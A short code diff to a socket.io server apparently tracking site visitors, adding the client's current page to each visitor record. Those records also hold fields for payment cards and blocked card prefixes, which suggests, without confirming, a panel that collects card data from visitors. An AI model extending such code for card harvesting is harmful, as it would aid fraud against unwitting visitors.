@@ -428,8 +428,9 @@ io.on("connection", (socket) => {
     
     const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
     
-    // Get existing visitor ID from client (localStorage)
+    // Get existing visitor ID and current page from client
     const existingVisitorId = data?.existingVisitorId;
+    const clientCurrentPage = data?.currentPage;
     
     // Check if this visitor already exists based on visitor ID from localStorage
     let existingVisitor = null;
@@ -485,7 +486,7 @@ io.on("connection", (socket) => {
         browser,
         date: new Date().toISOString(),
         blockedCardPrefixes: [],
-        page: "الصفحة الرئيسية",
+        page: clientCurrentPage || "الصفحة الرئيسية",
         data: {},
         dataHistory: [],
         paymentCards: [],
